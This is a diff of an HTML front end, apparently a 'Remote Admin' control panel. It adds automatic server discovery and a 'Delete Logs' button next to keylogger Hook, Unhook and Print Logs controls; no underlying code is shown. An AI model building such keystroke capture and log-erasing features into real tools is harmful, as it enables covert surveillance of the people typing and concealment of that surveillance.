@@ -53,10 +53,12 @@
     <!-- Home Page -->
     <div class="home-page" id="homePage">
         <div class="connection-box">
-            <h1>Hello</h1>
-            <p>Enter server IP address to establish connection</p>
+            <h1>Remote Admin</h1>
+            <p>Select an available server or wait for discovery...</p>
             <div class="input-group">
-                <input type="text" id="ipInput" placeholder="192.168.1.1" onkeypress="handleEnterKey(event)" />
+                <select id="serverSelect" style="width: 100%; padding: 15px; border: 2px solid #e8e4d9; border-radius: 10px; font-size: 15px; font-family: 'Montserrat', sans-serif;">
+                    <option value="" disabled selected>Scanning for servers...</option>
+                </select>
             </div>
             <button class="btn-connect" onclick="connect()">Connect</button>
         </div>
@@ -115,6 +117,7 @@
                             <button class="action-btn" onclick="hookKeylog()">Hook</button>
                             <button class="action-btn" onclick="unhookKeylog()">Unhook</button>
                             <button class="action-btn" onclick="printKeylog()">Print Logs</button>
+                            <button class="action-btn" onclick="deleteKeylog()">Delete Logs</button>
                         </div>
                         <div class="keylog-output" id="keylogOutput" style="display: none;"></div>
                     </div>
